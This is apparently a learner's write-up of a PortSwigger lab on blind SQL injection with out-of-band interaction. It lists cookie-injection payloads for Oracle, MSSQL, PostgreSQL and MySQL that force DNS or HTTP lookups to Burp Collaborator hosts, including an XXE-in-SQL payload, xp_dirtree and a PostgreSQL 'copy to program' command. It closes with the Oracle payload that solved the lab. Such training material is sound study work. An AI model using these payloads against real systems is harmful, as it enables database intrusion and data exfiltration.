
# Blind SQL injection with out-of-band interaction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

Learning path: If you're following our learning path, please note that the suggested solution for this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/blind

- https://portswigger.net/web-security/sql-injection/cheat-sheet




---------------------------------------------


### Oracle
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```

```
FFyToxqSs49lpxuC'+AND+select+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://q6xv6nktkah599jksflne4qcz35utqhf.oastify.com/">+%remote%3b]>'),'/l')+FROM+dual--

FFyToxqSs49lpxuC'+AND+SELECT+UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')--
```

### Microsoft
```
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

```
FFyToxqSs49lpxuC'+and+exec+master..xp_dirtree+'//BURP-COLLABORATOR-SUBDOMAIN/a'--
```

### PostgreSQL
```
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

```
FFyToxqSs49lpxuC'+||+(copy+(SELECT+'')+to+program+'nslookup+BURP-COLLABORATOR-SUBDOMAIN')--
```


### MySQL
```
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
```

```
FFyToxqSs49lpxuC'+AND+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--
```

-----------------------------------------------

Finally, the correct payload was the Oracle payload, changing the AND for a UNION and encoding the characters ;, ? and =:

```
Cookie: TrackingId=FFyToxqSs49lpxuC'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```



![img](images/Blind%20SQL%20injection%20with%20out-of-band%20interaction/1.png)




![img](images/Blind%20SQL%20injection%20with%20out-of-band%20interaction/2.png)